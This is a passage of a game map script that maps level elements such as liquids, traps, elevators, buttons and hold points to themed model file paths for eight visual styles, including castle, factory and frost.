	LIQUID_STREAM_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	LIQUID_STREAM_L_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	LIQUID_STREAM_R_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	LIQUID_STREAM_U_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	LIQUID_STREAM_D_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	LIQUID_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	LIQUID_FALL			={
							generic={main=["models/luffaren/collective_liquid_fall.mdl"]},
							castle={main=["models/luffaren/collective_liquid_fallcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_fallfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_falltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_fallnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_fallhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_fallfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_fallsilenthill.mdl"]},
						},
	HAZLIQUID			={
							generic={main=["models/luffaren/collective_liquid.mdl"]},
							castle={main=["models/luffaren/collective_liquidcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquidfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquidtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquidnature.mdl"]},
							hell={main=["models/luffaren/collective_liquidhell.mdl"]},
							frost={main=["models/luffaren/collective_liquidfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquidsilenthill.mdl"]},
						},
	HAZLIQUID_TUNNEL	={
							generic={main=["models/luffaren/collective_liquid_tunnel.mdl"]},
							castle={main=["models/luffaren/collective_liquid_tunnelcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_tunnelfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_tunneltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_tunnelnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_tunnelhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_tunnelfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_tunnelsilenthill.mdl"]},
						},
	HAZLIQUID_TUNNELWALL	={
							generic={main=["models/luffaren/collective_liquid_tunnel.mdl"],tunnelwallblock=["models/luffaren/collective_blockwall.mdl"]},
							castle={main=["models/luffaren/collective_liquid_tunnelcastle.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_tunnelfactory.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_tunneltemple.mdl"],tunnelwallblock=["models/luffaren/collective_blockwalltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_tunnelnature.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_tunnelhell.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_tunnelfrost.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_tunnelsilenthill.mdl"],tunnelwallblock=["models/luffaren/collective_blockwallsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM	={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_L	={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_R	={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_U	={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_D	={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_stream.mdl"]},
							castle={main=["models/luffaren/collective_liquid_streamcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_streamfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_streamtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_streamnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_streamhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_streamfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_streamsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_L_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_R_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_U_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	HAZLIQUID_STREAM_D_SHALLOW		={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	HAZLIQUID_SHALLOW	={
							generic={main=["models/luffaren/collective_liquid_shallow.mdl"]},
							castle={main=["models/luffaren/collective_liquid_shallowcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_shallowfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_shallowtemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_shallownature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_shallowhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_shallowfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_shallowsilenthill.mdl"]},
						},
	HAZLIQUID_FALL		={
							generic={main=["models/luffaren/collective_liquid_fall.mdl"]},
							castle={main=["models/luffaren/collective_liquid_fallcastle.mdl"]},
							factory={main=["models/luffaren/collective_liquid_fallfactory.mdl"]},
							temple={main=["models/luffaren/collective_liquid_falltemple.mdl"]},
							nature={main=["models/luffaren/collective_liquid_fallnature.mdl"]},
							hell={main=["models/luffaren/collective_liquid_fallhell.mdl"]},
							frost={main=["models/luffaren/collective_liquid_fallfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_liquid_fallsilenthill.mdl"]},
						},
	TRAPFLOOR			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	TRAPSTEP			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	TRAPVICINITY			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	TRAPSPAWN			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	TRAPRANDOM			={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	DETAIL				={
							generic={main=[
								"models/luffaren/collective_detail.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_detailcastle.mdl",
								"models/luffaren/collective_detailcastle1.mdl",
								"models/luffaren/collective_detailcastle2.mdl",
								"models/luffaren/collective_detailcastle2.mdl",
								"models/luffaren/collective_detailcastle2.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_detailfactory.mdl",
								"models/luffaren/collective_detailfactory1.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_detailtemple.mdl",
								"models/luffaren/collective_detailtemple1.mdl",
								"models/luffaren/collective_detailtemple2.mdl",
								"models/luffaren/collective_detailtemple3.mdl",
								"models/luffaren/collective_detailtemple4.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_detailnature.mdl",
								"models/luffaren/collective_detail1nature.mdl",
								"models/luffaren/collective_detail2nature.mdl",
								"models/luffaren/collective_detail3nature.mdl",
								"models/luffaren/collective_detail4nature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_detailhell.mdl",
								"models/luffaren/collective_detail1hell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_detailfrost.mdl",
								"models/luffaren/collective_detailfrost2.mdl",
								"models/luffaren/collective_detailfrost3.mdl",
								"models/luffaren/collective_detailfrost4.mdl",
								"models/luffaren/collective_detailfrost5.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_detailsilenthill.mdl",
								"models/luffaren/collective_detailsilenthill2.mdl",
								"models/luffaren/collective_detailsilenthill3.mdl",
							]},
						},
	ELEVATOR			={
							generic={main=[
								"models/luffaren/collective_elevator.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatortemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatornature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorsilenthill.mdl",
							]},
						},
	ELEVATORBIG			={
							generic={main=[
								"models/luffaren/collective_elevatorbig.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorbigcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorbigfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatorbigtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatorbignature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorbighell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorbigfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorbigsilenthill.mdl",
							]},
						},
	ELEVATORHUGE		={
							generic={main=[
								"models/luffaren/collective_elevatorhuge.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorhugecastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorhugefactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatorhugetemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatorhugenature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorhugehell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorhugefrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorhugesilenthill.mdl",
							]},
						},
	MOVEPLAT			={
							generic={main=[
								"models/luffaren/collective_elevator.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatortemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatornature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorsilenthill.mdl",
							]},
						},
	MOVEPLATBIG			={
							generic={main=[
								"models/luffaren/collective_elevatorbig.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorbigcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorbigfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatorbigtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatorbignature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorbighell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorbigfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorbigsilenthill.mdl",
							]},
						},
	MOVEPLATHUGE		={
							generic={main=[
								"models/luffaren/collective_elevatorhuge.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_elevatorhugecastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_elevatorhugefactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_elevatorhugetemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_elevatorhugenature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_elevatorhugehell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_elevatorhugefrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_elevatorhugesilenthill.mdl",
							]},
						},
	ELEVATOR_FLOOR		={
							generic={main=[
								"models/luffaren/collective_floor.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorcastle.mdl",
								"models/luffaren/collective_floorcastle1.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple.mdl",
								"models/luffaren/collective_floortemple1.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floornature.mdl",
								"models/luffaren/collective_floor1nature.mdl",
								"models/luffaren/collective_floor2nature.mdl",
								"models/luffaren/collective_floor3nature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorsilenthill.mdl",
							]},
						},
	ELEVATOR_CEILING	={
							generic={main=[
								"models/luffaren/collective_floorceiling.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorceilingcastle.mdl",
								"models/luffaren/collective_floorceilingcastle1.mdl",
								"models/luffaren/collective_floorceilingcastle2.mdl",
								"models/luffaren/collective_floorceilingcastle3.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorceilingfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple.mdl",
								"models/luffaren/collective_floorceilingtemple1.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floorceilingnature.mdl",
								"models/luffaren/collective_floorceiling1nature.mdl",
								"models/luffaren/collective_floorceiling2nature.mdl",
								"models/luffaren/collective_floorceiling3nature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorceilinghell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorceilingfrost.mdl",
								"models/luffaren/collective_floorceilingfrost2.mdl",
								"models/luffaren/collective_floorceilingfrost3.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorceilingsilenthill.mdl",
							]},
						},
	ELEVATOR_CEILINGTALL	={
							generic={main=[
								"models/luffaren/collective_floorceilingtall.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_floorceilingtallcastle.mdl",
								"models/luffaren/collective_floorceilingtallcastle1.mdl",
								"models/luffaren/collective_floorceilingtallcastle2.mdl",
								"models/luffaren/collective_floorceilingtallcastle3.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_floorceilingtallfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple.mdl",
								"models/luffaren/collective_floorceilingtalltemple1.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_floorceilingtallnature.mdl",
								"models/luffaren/collective_floorceilingtall1nature.mdl",
								"models/luffaren/collective_floorceilingtall2nature.mdl",
								"models/luffaren/collective_floorceilingtall3nature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_floorceilingtallhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_floorceilingtallfrost.mdl",
								"models/luffaren/collective_floorceilingtallfrost2.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_floorceilingtallsilenthill.mdl",
							]},
						},
	ITEM_H				={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	ITEM_Z				={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	BREAKABLE			={
							generic={main=[
								"models/luffaren/collective_blockwall.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_blockwallcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_blockwallfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_blockwalltemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_blockwallnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_blockwallhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_blockwallfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_blockwallsilenthill.mdl",
							]},
						},
	GENERICHOLD			={
							generic={main=[
								"models/luffaren/collective_holdgeneric.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_holdgenericcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_holdgenericfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_holdgenerictemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_holdgenericnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_holdgenerichell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_holdgenericfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_holdgenericsilenthill.mdl",
							]},
						},
	ENDBUTTON			={
							generic={main=[
								"models/luffaren/collective_button.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_buttoncastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_buttonfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_buttontemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_buttonnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_buttonhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_buttonfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_buttonsilenthill.mdl",
							]},
						},
	HOLD_1				={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},
	HOLD_1_INVERTED		={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},	
	BUTTON_1			={
							generic={main=["models/luffaren/collective_button.mdl"]},
							castle={main=["models/luffaren/collective_buttoncastle.mdl"]},
							factory={main=["models/luffaren/collective_buttonfactory.mdl"]},
							temple={main=["models/luffaren/collective_buttontemple.mdl"]},
							nature={main=["models/luffaren/collective_buttonnature.mdl"]},
							hell={main=["models/luffaren/collective_buttonhell.mdl"]},
							frost={main=["models/luffaren/collective_buttonfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_buttonsilenthill.mdl"]},
						},
	HOLD_2				={
							generic={main=["models/luffaren/collective_hold.mdl"]},
